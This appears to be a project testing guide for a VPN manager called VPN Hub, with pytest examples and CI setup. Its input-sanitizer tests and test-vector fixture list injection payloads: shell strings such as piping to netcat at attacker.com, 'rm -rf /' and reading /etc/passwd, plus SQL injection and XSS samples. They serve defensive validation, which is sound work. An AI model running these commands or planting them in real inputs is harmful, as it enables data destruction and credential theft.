# VPN Hub Testing Guide

Comprehensive testing guide for VPN Hub enterprise-grade secure VPN manager.

## 📋 Table of Contents

- [Testing Overview](#testing-overview)
- [Test Environment Setup](#test-environment-setup)
- [Unit Testing](#unit-testing)
- [Integration Testing](#integration-testing)
- [Security Testing](#security-testing)
- [Performance Testing](#performance-testing)
- [Manual Testing](#manual-testing)
- [Test Automation](#test-automation)

## 🧪 Testing Overview

VPN Hub implements comprehensive testing to ensure security, reliability, and performance across all components.

### **Testing Pyramid**

```
    Manual Testing (5%)
         /\
        /  \
   Integration (25%)
      /      \
     /        \
   Unit Tests (70%)
```

### **Test Categories**

- **Unit Tests**: Individual component testing
- **Integration Tests**: Component interaction testing
- **Security Tests**: Vulnerability and compliance testing
- **Performance Tests**: Speed and resource usage testing
- **End-to-End Tests**: Complete user workflow testing
- **Penetration Tests**: Security breach simulation

## 🔧 Test Environment Setup

### **Prerequisites**

```bash
# Install testing dependencies
pip install pytest pytest-asyncio pytest-cov pytest-mock
pip install selenium webdriver-manager  # For GUI testing
pip install bandit safety  # For security testing
pip install memory_profiler psutil  # For performance testing
```

### **Test Configuration**

```python
# pytest.ini
[tool:pytest]
minversion = 6.0
addopts = -ra -q --strict-markers --cov=src --cov-report=html --cov-report=term-missing
testpaths = tests
python_files = test_*.py *_test.py
python_classes = Test*
python_functions = test_*
markers =
    unit: Unit tests
    integration: Integration tests
    security: Security tests
    performance: Performance tests
    slow: Slow running tests
    gui: GUI tests
```

### **Test Directory Structure**

```
tests/
├── unit/
│   ├── test_providers/
│   ├── test_security/
│   ├── test_config/
│   └── test_utils/
├── integration/
│   ├── test_provider_integration.py
│   ├── test_security_integration.py
│   └── test_gui_integration.py
├── security/
│   ├── test_vulnerability_scan.py
│   ├── test_penetration.py
│   └── test_compliance.py
├── performance/
│   ├── test_connection_speed.py
│   ├── test_memory_usage.py
│   └── test_cpu_usage.py
├── fixtures/
│   ├── conftest.py
│   └── test_data.py
└── manual/
    ├── test_scenarios.md
    └── test_checklist.md
```

## 🔬 Unit Testing

### **Provider Testing**

```python
# tests/unit/test_providers/test_nordvpn.py
import pytest
import asyncio
from unittest.mock import Mock, patch, MagicMock
from src.providers.nordvpn import NordVPNProvider
from src.exceptions import AuthenticationError, ConnectionError

class TestNordVPNProvider:
    """Test suite for NordVPN provider."""
    
    @pytest.fixture
    def provider(self):
        """Create NordVPN provider instance."""
        return NordVPNProvider()
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_authentication_success(self, provider):
        """Test successful authentication."""
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.return_value.returncode = 0
            mock_exec.return_value.stdout = "Login successful"
            
            result = await provider.authenticate("valid_user", "valid_pass")
            assert result is True
            mock_exec.assert_called_once()
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_authentication_failure(self, provider):
        """Test authentication failure."""
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.return_value.returncode = 1
            mock_exec.return_value.stderr = "Invalid credentials"
            
            result = await provider.authenticate("invalid_user", "invalid_pass")
            assert result is False
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_connection_timeout(self, provider):
        """Test connection timeout handling."""
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.side_effect = TimeoutError("Connection timeout")
            
            result = await provider.connect("slow-server.nordvpn.com")
            assert result is False
    
    @pytest.mark.unit
    @pytest.mark.asyncio
    async def test_server_list_parsing(self, provider):
        """Test server list parsing."""
        mock_server_data = [
            {"name": "us3045.nordvpn.com", "country": "US", "load": 15},
            {"name": "uk1829.nordvpn.com", "country": "UK", "load": 32}
        ]
        
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.return_value.returncode = 0
            mock_exec.return_value.stdout = json.dumps(mock_server_data)
            
            servers = await provider.get_servers()
            assert len(servers) == 2
            assert servers[0]['name'] == "us3045.nordvpn.com"
            assert servers[1]['country'] == "UK"
```

### **Security Module Testing**

```python
# tests/unit/test_security/test_input_sanitizer.py
import pytest
from src.security.input_sanitizer import InputSanitizer
from src.exceptions import ValidationError

class TestInputSanitizer:
    """Test suite for input sanitizer."""
    
    @pytest.fixture
    def sanitizer(self):
        """Create sanitizer instance."""
        return InputSanitizer()
    
    @pytest.mark.unit
    def test_sanitize_username_valid(self, sanitizer):
        """Test valid username sanitization."""
        valid_usernames = [
            "user@example.com",
            "testuser123",
            "user.name_123"
        ]
        
        for username in valid_usernames:
            result = sanitizer.sanitize_username(username)
            assert result == username
    
    @pytest.mark.unit
    def test_sanitize_username_invalid(self, sanitizer):
        """Test invalid username rejection."""
        invalid_usernames = [
            "user;rm -rf /",  # Command injection
            "../../../etc/passwd",  # Directory traversal
            "user<script>alert('xss')</script>",  # XSS
            "' OR '1'='1",  # SQL injection
        ]
        
        for username in invalid_usernames:
            with pytest.raises(ValidationError):
                sanitizer.sanitize_username(username)
    
    @pytest.mark.unit
    def test_sanitize_password_length_limit(self, sanitizer):
        """Test password length validation."""
        # Test maximum length
        max_password = "a" * 200
        result = sanitizer.sanitize_password(max_password)
        assert result == max_password
        
        # Test over-length password
        over_length_password = "a" * 201
        with pytest.raises(ValidationError):
            sanitizer.sanitize_password(over_length_password)
    
    @pytest.mark.unit
    def test_sanitize_server_name_valid(self, sanitizer):
        """Test valid server name sanitization."""
        valid_servers = [
            "us3045.nordvpn.com",
            "uk-london-01.expressvpn.com",
            "192.168.1.1"
        ]
        
        for server in valid_servers:
            result = sanitizer.sanitize_server_name(server)
            assert result == server
    
    @pytest.mark.unit
    def test_sanitize_ip_address(self, sanitizer):
        """Test IP address validation."""
        valid_ips = ["192.168.1.1", "10.0.0.1", "172.16.0.1"]
        invalid_ips = ["999.999.999.999", "not.an.ip", "127.0.0.1; rm -rf /"]
        
        for ip in valid_ips:
            result = sanitizer.sanitize_ip_address(ip)
            assert result == ip
        
        for ip in invalid_ips:
            with pytest.raises(ValidationError):
                sanitizer.sanitize_ip_address(ip)
```

### **Configuration Testing**

```python
# tests/unit/test_config/test_config_manager.py
import pytest
import tempfile
import os
from src.config.config_manager import ConfigManager

class TestConfigManager:
    """Test suite for configuration manager."""
    
    @pytest.fixture
    def temp_config_file(self):
        """Create temporary config file."""
        fd, path = tempfile.mkstemp(suffix='.yaml')
        os.close(fd)
        yield path
        os.unlink(path)
    
    @pytest.fixture
    def config_manager(self, temp_config_file):
        """Create config manager with temp file."""
        return ConfigManager(config_path=temp_config_file)
    
    @pytest.mark.unit
    def test_load_default_config(self, config_manager):
        """Test loading default configuration."""
        config = config_manager.load_default_config()
        
        assert 'security' in config
        assert 'network' in config
        assert 'gui' in config
        assert config['security']['input_sanitization']['enabled'] is True
    
    @pytest.mark.unit
    def test_save_and_load_config(self, config_manager):
        """Test saving and loading configuration."""
        # Create test config
        test_config = {
            'test_section': {
                'test_key': 'test_value',
                'test_number': 42
            }
        }
        
        # Save config
        success = config_manager.save_config(test_config)
        assert success is True
        
        # Load config
        loaded_config = config_manager.load_config()
        assert loaded_config['test_section']['test_key'] == 'test_value'
        assert loaded_config['test_section']['test_number'] == 42
    
    @pytest.mark.unit
    def test_get_setting(self, config_manager):
        """Test getting specific settings."""
        # Set up test config
        test_config = {'section': {'subsection': {'key': 'value'}}}
        config_manager.save_config(test_config)
        
        # Test getting nested setting
        value = config_manager.get_setting('section.subsection.key')
        assert value == 'value'
        
        # Test getting non-existent setting with default
        default_value = config_manager.get_setting('non.existent.key', 'default')
        assert default_value == 'default'
```

## 🔗 Integration Testing

### **Provider Integration Testing**

```python
# tests/integration/test_provider_integration.py
import pytest
import asyncio
from src.core.vpn_manager import VPNManager
from src.providers import VPNProviderFactory

class TestProviderIntegration:
    """Integration tests for VPN providers."""
    
    @pytest.fixture
    def vpn_manager(self):
        """Create VPN manager instance."""
        return VPNManager()
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_provider_factory_creation(self):
        """Test provider creation through factory."""
        providers = ['nordvpn', 'expressvpn', 'surfshark', 'cyberghost', 'protonvpn']
        
        for provider_name in providers:
            provider = VPNProviderFactory.create_provider(provider_name)
            assert provider is not None
            assert provider.name == provider_name
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_vpn_manager_provider_listing(self, vpn_manager):
        """Test VPN manager provider listing."""
        providers = vpn_manager.list_providers()
        
        expected_providers = ['nordvpn', 'expressvpn', 'surfshark', 'cyberghost', 'protonvpn']
        for provider in expected_providers:
            assert provider in providers
    
    @pytest.mark.integration
    @pytest.mark.asyncio
    async def test_provider_security_features(self):
        """Test provider security features availability."""
        providers = ['nordvpn', 'expressvpn', 'surfshark']
        
        for provider_name in providers:
            provider = VPNProviderFactory.create_provider(provider_name)
            features = await provider.get_security_features()
            
            # All providers should have basic security features
            assert 'kill_switch' in features
            assert 'dns_leak_protection' in features
```

### **Security Integration Testing**

```python
# tests/integration/test_security_integration.py
import pytest
from src.security.input_sanitizer import InputSanitizer
from src.security.secure_command_executor import SecureCommandExecutor
from src.security.security_monitor import SecurityMonitor

class TestSecurityIntegration:
    """Integration tests for security components."""
    
    @pytest.mark.integration
    def test_sanitizer_executor_integration(self):
        """Test sanitizer and executor integration."""
        sanitizer = InputSanitizer()
        executor = SecureCommandExecutor()
        
        # Test safe command execution with sanitized inputs
        clean_input = sanitizer.sanitize_username("test_user")
        result = executor.execute_command(['echo', clean_input])
        
        assert result.returncode == 0
        assert 'test_user' in result.stdout
    
    @pytest.mark.integration
    def test_security_monitor_integration(self):
        """Test security monitor integration."""
        monitor = SecurityMonitor()
        
        # Test logging security event
        monitor.log_security_event('TEST_EVENT', 'Integration test event')
        
        # Test retrieving events
        events = monitor.get_security_events(hours=1)
        test_events = [e for e in events if e['type'] == 'TEST_EVENT']
        
        assert len(test_events) > 0
        assert test_events[0]['description'] == 'Integration test event'
```

## 🛡️ Security Testing

### **Vulnerability Testing**

```python
# tests/security/test_vulnerability_scan.py
import pytest
import subprocess
import json
from pathlib import Path

class TestVulnerabilityScanning:
    """Security vulnerability tests."""
    
    @pytest.mark.security
    def test_bandit_security_scan(self):
        """Run Bandit security scan on source code."""
        result = subprocess.run(
            ['bandit', '-r', 'src/', '-f', 'json'],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            # Parse Bandit results
            try:
                bandit_results = json.loads(result.stdout)
                high_severity_issues = [
                    issue for issue in bandit_results.get('results', [])
                    if issue.get('issue_severity') == 'HIGH'
                ]
                
                if high_severity_issues:
                    pytest.fail(f"High severity security issues found: {high_severity_issues}")
            except json.JSONDecodeError:
                pytest.fail(f"Bandit scan failed: {result.stderr}")
    
    @pytest.mark.security
    def test_dependency_vulnerability_scan(self):
        """Check for known vulnerabilities in dependencies."""
        result = subprocess.run(['safety', 'check', '--json'], capture_output=True, text=True)
        
        if result.returncode != 0:
            try:
                safety_results = json.loads(result.stdout)
                if safety_results:
                    pytest.fail(f"Vulnerable dependencies found: {safety_results}")
            except json.JSONDecodeError:
                pytest.fail(f"Safety check failed: {result.stderr}")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_injection_attack_prevention(self):
        """Test prevention of injection attacks."""
        from src.security.input_sanitizer import InputSanitizer
        
        sanitizer = InputSanitizer()
        
        # Test command injection prevention
        malicious_inputs = [
            "user; rm -rf /",
            "user && cat /etc/passwd",
            "user | nc attacker.com 1234",
            "user`whoami`",
            "user$(id)"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(Exception):  # Should raise ValidationError
                sanitizer.sanitize_username(malicious_input)
    
    @pytest.mark.security
    def test_file_permission_security(self):
        """Test file permission security."""
        import os
        import stat
        
        # Check sensitive file permissions
        sensitive_files = [
            'src/security/credential_manager.py',
            'config/security.yaml'
        ]
        
        for file_path in sensitive_files:
            if os.path.exists(file_path):
                file_stat = os.stat(file_path)
                mode = stat.filemode(file_stat.st_mode)
                
                # File should not be world-readable
                assert not (file_stat.st_mode & stat.S_IROTH), f"{file_path} is world-readable"
                # File should not be world-writable
                assert not (file_stat.st_mode & stat.S_IWOTH), f"{file_path} is world-writable"
```

### **Penetration Testing**

```python
# tests/security/test_penetration.py
import pytest
import asyncio
import subprocess
from unittest.mock import patch
from src.providers.nordvpn import NordVPNProvider

class TestPenetrationTesting:
    """Penetration testing for security validation."""
    
    @pytest.mark.security
    @pytest.mark.slow
    @pytest.mark.asyncio
    async def test_brute_force_protection(self):
        """Test brute force attack protection."""
        provider = NordVPNProvider()
        
        # Attempt multiple failed authentications
        failed_attempts = 0
        for i in range(10):
            try:
                result = await provider.authenticate(f"fake_user_{i}", "fake_password")
                if not result:
                    failed_attempts += 1
            except Exception:
                failed_attempts += 1
        
        # Should have rate limiting or account lockout
        assert failed_attempts >= 5, "Brute force protection may be insufficient"
    
    @pytest.mark.security
    def test_memory_leak_protection(self):
        """Test for memory leaks in credential handling."""
        import gc
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Perform memory-intensive operations
        for i in range(100):
            from src.security.credential_manager import CredentialManager
            cred_manager = CredentialManager()
            # Simulate credential operations
            del cred_manager
        
        # Force garbage collection
        gc.collect()
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be minimal (less than 10MB)
        assert memory_increase < 10 * 1024 * 1024, f"Memory leak detected: {memory_increase} bytes"
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self):
        """Test resistance to timing attacks."""
        import time
        from src.security.input_sanitizer import InputSanitizer
        
        sanitizer = InputSanitizer()
        
        # Test timing consistency for different input lengths
        short_input = "a"
        long_input = "a" * 100
        
        times_short = []
        times_long = []
        
        for _ in range(10):
            start = time.time()
            sanitizer.sanitize_username(short_input)
            times_short.append(time.time() - start)
            
            start = time.time()
            sanitizer.sanitize_username(long_input)
            times_long.append(time.time() - start)
        
        avg_short = sum(times_short) / len(times_short)
        avg_long = sum(times_long) / len(times_long)
        
        # Timing difference should be minimal (less than 10ms difference per character)
        time_per_char = (avg_long - avg_short) / 99
        assert time_per_char < 0.01, f"Potential timing attack vector: {time_per_char}s per char"
```

## ⚡ Performance Testing

### **Connection Speed Testing**

```python
# tests/performance/test_connection_speed.py
import pytest
import time
import asyncio
from unittest.mock import Mock, patch
from src.providers.nordvpn import NordVPNProvider

class TestConnectionPerformance:
    """Performance tests for VPN connections."""
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_connection_time(self):
        """Test VPN connection establishment time."""
        provider = NordVPNProvider()
        
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.return_value.returncode = 0
            
            start_time = time.time()
            result = await provider.connect("test-server.nordvpn.com")
            connection_time = time.time() - start_time
            
            assert result is True
            assert connection_time < 30, f"Connection took too long: {connection_time}s"
    
    @pytest.mark.performance
    @pytest.mark.asyncio
    async def test_server_list_retrieval_speed(self):
        """Test server list retrieval performance."""
        provider = NordVPNProvider()
        
        mock_servers = [{"name": f"server{i}.nordvpn.com", "country": "US"} for i in range(1000)]
        
        with patch.object(provider.executor, 'execute_command') as mock_exec:
            mock_exec.return_value.returncode = 0
            mock_exec.return_value.stdout = json.dumps(mock_servers)
            
            start_time = time.time()
            servers = await provider.get_servers()
            retrieval_time = time.time() - start_time
            
            assert len(servers) == 1000
            assert retrieval_time < 5, f"Server retrieval took too long: {retrieval_time}s"
    
    @pytest.mark.performance
    def test_memory_usage(self):
        """Test memory usage under load."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Create multiple provider instances
        providers = []
        for i in range(10):
            providers.append(NordVPNProvider())
        
        peak_memory = process.memory_info().rss
        memory_per_provider = (peak_memory - initial_memory) / 10
        
        # Each provider should use less than 10MB
        assert memory_per_provider < 10 * 1024 * 1024, f"High memory usage: {memory_per_provider} bytes per provider"
```

### **Load Testing**

```python
# tests/performance/test_load.py
import pytest
import asyncio
import time
from concurrent.futures import ThreadPoolExecutor
from src.core.vpn_manager import VPNManager

class TestLoadTesting:
    """Load testing for VPN Hub."""
    
    @pytest.mark.performance
    @pytest.mark.slow
    def test_concurrent_connections(self):
        """Test handling multiple concurrent operations."""
        vpn_manager = VPNManager()
        
        def simulate_user_session():
            """Simulate a user session."""
            try:
                providers = vpn_manager.list_providers()
                for provider_name in providers[:3]:  # Test first 3 providers
                    provider = vpn_manager.get_provider(provider_name)
                    status = asyncio.run(provider.get_status())
                return True
            except Exception:
                return False
        
        # Run 20 concurrent user sessions
        with ThreadPoolExecutor(max_workers=20) as executor:
            start_time = time.time()
            futures = [executor.submit(simulate_user_session) for _ in range(20)]
            results = [future.result() for future in futures]
            total_time = time.time() - start_time
        
        success_rate = sum(results) / len(results)
        assert success_rate >= 0.95, f"Low success rate under load: {success_rate}"
        assert total_time < 30, f"Load test took too long: {total_time}s"
```

## 🖱️ Manual Testing

### **GUI Testing Scenarios**

```markdown
# tests/manual/gui_test_scenarios.md

## GUI Test Scenarios

### Scenario 1: Basic Connection Flow
1. Launch VPN Hub application
2. Select NordVPN provider
3. Enter valid credentials
4. Click "Connect" button
5. Verify connection status shows "Connected"
6. Verify IP address has changed
7. Click "Disconnect" button
8. Verify connection status shows "Disconnected"

**Expected Result**: Smooth connection/disconnection flow without errors

### Scenario 2: Provider Switching
1. Connect to NordVPN
2. Without disconnecting, switch to ExpressVPN
3. Application should automatically disconnect from NordVPN
4. Connect to ExpressVPN
5. Verify new connection is established

**Expected Result**: Clean provider switching with proper disconnection

### Scenario 3: Kill Switch Testing
1. Enable kill switch in settings
2. Connect to any VPN provider
3. Manually disconnect VPN (simulate connection drop)
4. Try to access internet
5. Verify internet access is blocked

**Expected Result**: No internet access when VPN is disconnected with kill switch enabled
```

### **Security Testing Checklist**

```markdown
# tests/manual/security_test_checklist.md

## Security Testing Checklist

### Authentication Security
- [ ] Invalid credentials are rejected
- [ ] Credentials are not logged in plain text
- [ ] Session tokens expire appropriately
- [ ] Multiple failed attempts trigger lockout

### Input Validation
- [ ] Special characters in usernames are handled safely
- [ ] SQL injection attempts are blocked
- [ ] XSS attempts are neutralized
- [ ] Command injection is prevented

### Network Security
- [ ] SSL/TLS certificates are validated
- [ ] Weak cipher suites are rejected
- [ ] DNS leaks are prevented
- [ ] IP leaks are prevented

### File System Security
- [ ] Configuration files have appropriate permissions
- [ ] Temporary files are securely deleted
- [ ] Log files don't contain sensitive data
- [ ] Backup files are encrypted
```

## 🤖 Test Automation

### **Continuous Integration Setup**

```yaml
# .github/workflows/tests.yml
name: VPN Hub Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.8, 3.9, 3.10, 3.11]

    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v3
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -r requirements.txt
        pip install -r requirements-test.txt
    
    - name: Run unit tests
      run: |
        pytest tests/unit/ -v --cov=src --cov-report=xml
    
    - name: Run integration tests
      run: |
        pytest tests/integration/ -v
    
    - name: Run security tests
      run: |
        pytest tests/security/ -v
        bandit -r src/ -f json
        safety check
    
    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
```

### **Test Data Management**

```python
# tests/fixtures/test_data.py
import pytest

@pytest.fixture
def mock_server_data():
    """Mock server data for testing."""
    return [
        {
            "name": "us3045.nordvpn.com",
            "country": "United States",
            "city": "New York",
            "load": 15,
            "features": ["P2P", "Onion Over VPN"],
            "protocols": ["OpenVPN", "WireGuard"]
        },
        {
            "name": "uk1829.nordvpn.com",
            "country": "United Kingdom",
            "city": "London",
            "load": 32,
            "features": ["Dedicated IP"],
            "protocols": ["OpenVPN", "WireGuard"]
        }
    ]

@pytest.fixture
def mock_credentials():
    """Mock credentials for testing."""
    return {
        "nordvpn": ("test_user", "test_password"),
        "expressvpn": ("test_activation_code",),
        "surfshark": ("test_user", "test_password")
    }

@pytest.fixture
def security_test_vectors():
    """Security test vectors for injection testing."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--"
        ],
        "command_injection": [
            "; rm -rf /",
            "| nc attacker.com 1234",
            "&& cat /etc/passwd",
            "`whoami`",
            "$(id)"
        ],
        "xss": [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//"
        ]
    }
```

## 📊 Test Reporting

### **Coverage Reporting**

```bash
# Generate comprehensive coverage report
pytest --cov=src --cov-report=html --cov-report=term-missing --cov-report=xml

# View HTML coverage report
open htmlcov/index.html

# Coverage thresholds
pytest --cov=src --cov-fail-under=90
```

### **Performance Benchmarking**

```python
# tests/performance/benchmark.py
import pytest
import time
from memory_profiler import profile

class TestBenchmarks:
    """Performance benchmarks."""
    
    @pytest.mark.benchmark
    def test_provider_creation_benchmark(self, benchmark):
        """Benchmark provider creation time."""
        from src.providers import VPNProviderFactory
        
        def create_provider():
            return VPNProviderFactory.create_provider('nordvpn')
        
        result = benchmark(create_provider)
        assert result is not None
    
    @pytest.mark.benchmark
    @profile
    def test_memory_profile(self):
        """Profile memory usage."""
        from src.core.vpn_manager import VPNManager
        
        managers = []
        for i in range(100):
            managers.append(VPNManager())
        
        # Memory usage tracked by @profile decorator
        del managers
```

## 📞 Testing Support

### **Test Environment Issues**
- **Email**: test-support@vpnhub.local
- **Test Infrastructure**: test-infra@vpnhub.local
- **CI/CD Issues**: ci-support@vpnhub.local

### **Test Data and Fixtures**
- **Test Data Requests**: test-data@vpnhub.local
- **Mock Services**: mock-services@vpnhub.local
- **Performance Baselines**: perf-testing@vpnhub.local

---

**Testing Framework Version:** 2.0  
**Last Updated:** November 1, 2025  
**For Support:** testing@vpnhub.local